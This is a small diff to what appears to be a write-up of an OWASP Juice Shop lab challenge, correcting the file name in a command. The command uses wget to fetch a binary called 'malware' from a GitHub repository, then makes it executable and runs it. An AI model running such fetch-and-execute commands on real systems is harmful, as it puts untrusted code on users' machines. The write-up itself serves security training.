@@ -30,7 +30,7 @@ Since Juice Shop is running on my local machine (a Linux system), the goal is to
 
 - **Command to execute:** 
   ```bash
-  wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware
+  wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_amd_64?raw=true && chmod +x malware && ./malware
   ```
 
 This command downloads the malware, makes it executable, and then runs it.
